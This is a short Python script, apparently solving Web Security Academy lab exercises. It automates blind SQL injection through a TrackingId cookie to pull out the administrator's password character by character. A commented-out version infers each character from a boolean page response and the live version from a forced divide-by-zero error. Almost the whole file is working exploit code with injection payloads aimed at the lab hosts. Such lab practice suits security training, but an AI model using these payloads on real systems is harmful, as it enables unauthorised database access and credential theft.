# import requests
# import string

# URL = "https://0a4700c70486bfdc80e15320001a0077.web-security-academy.net/"

# cookies = {
#     "session" : "2jm9O8AiP0cEXt891ojntXzKGSyrJIo7",
#     "TrackingId" : "X3qrfxDah3FET9LN"
# }

# password = ""
# trackingID_original = "X3qrfxDah3FET9LN"

# CHARSET = string.ascii_letters + string.digits

# for i in range(1,21):

#     Found = False

#     for c in CHARSET:

#         pay_load = (trackingID_original + f"' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i}, 1) = '{c}'--")
#         cookies["TrackingId"] = pay_load

#         response = requests.get(URL, cookies=cookies)

#         if "Welcome back!" in response.text:
#             Found = True
#             password += c
#             print(f"[+] Found character: {i} : {c}")
#             break
#     if not Found:
#         print(f"[!] Not Found")
#         break

# print(f"Password is : {password}")

import requests 
import string 

URL = "https://0a2c0004041fd51180f20804003d00a8.web-security-academy.net/"

cookies = {
    "session" : "VSNCkSaWCrgFyYxrWuJ6CV3YUtT472Z9",
    "TrackingId" : "x80GsSkKejryN2Oy"
}

CHARSET = string.ascii_letters + string.digits 

TrackingId_original = ""

password = ""

for i in range(1,21):
    found = False
    for c in CHARSET:

        payload = TrackingId_original + f"' || (SELECT CASE WHEN SUBSTR(password, {i}, 1) = '{c}' THEN to_char(1/0) ELSE '' END FROM users WHERE username = 'administrator')--"

        cookies["TrackingId"] = payload

        response = requests.get(URL, cookies=cookies)

        if response.status_code == 500:
            password += c

            found = True

            print(f"[+] Found charactor {i} : {c}")

            break
        else:
            print(f"[-] Charactor {i} not match in {c}")
    
    if(found == False):
        print(f"[-] Not Found")
        break

print(f"Password is {password}")